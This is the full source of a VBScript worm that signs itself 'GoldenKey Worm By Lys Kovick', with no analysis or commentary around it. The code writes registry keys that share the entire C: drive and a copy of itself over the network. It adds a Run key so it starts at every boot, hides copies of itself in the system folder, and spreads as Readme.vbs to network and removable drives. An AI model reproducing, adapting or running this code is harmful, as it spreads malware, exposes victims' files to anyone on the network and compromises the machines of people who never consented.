On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sysfolder = fso.GetSpecialFolder(SystemFolder)   
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Flags", 402, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Type", 0, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Path", "C:\"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Parm1enc", -1837192444, "REG_BINARY"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\!\Remark", "GoldenKey"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\README!\Flags", 401, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\README!\Type", 0, "REG_DWORD"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\README!\Path", sysfolder & "\GoldenKey\Readme.vbs"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\README!\Remark", "GoldenKey"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\GoldenKey", sysfolder & "\GoldenKey.lys"
WSHShell.RegWrite "HKEY_CLASSES_ROOT\.lys\", "VBSFile"
fso.CopyFile Wscript.ScriptFullName, sysfolder & "\GoldenKey.lys"
fso.GetFile(sysfolder & "\GoldenKey.lys").attributes = 2
fso.CreateFolder sysfolder & "\GoldenKey"
fso.CopyFile Wscript.ScriptFullName, sysfolder & "\GoldenKey\Readme.vbs"
fso.GetFolder(sysfolder & "\GoldenKey").attributes = 2
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 3 Then
fso.CopyFile Wscript.ScriptFullName, d.DriveLetter & ":\Readme.vbs"
ElseIf d.DriveType = 1 And d.IsRead Then
fso.CopyFile Wscript.ScriptFullName, d.DriveLetter & ":\Readme.vbs"
End If
Next
'GoldenKey Worm By Lys Kovick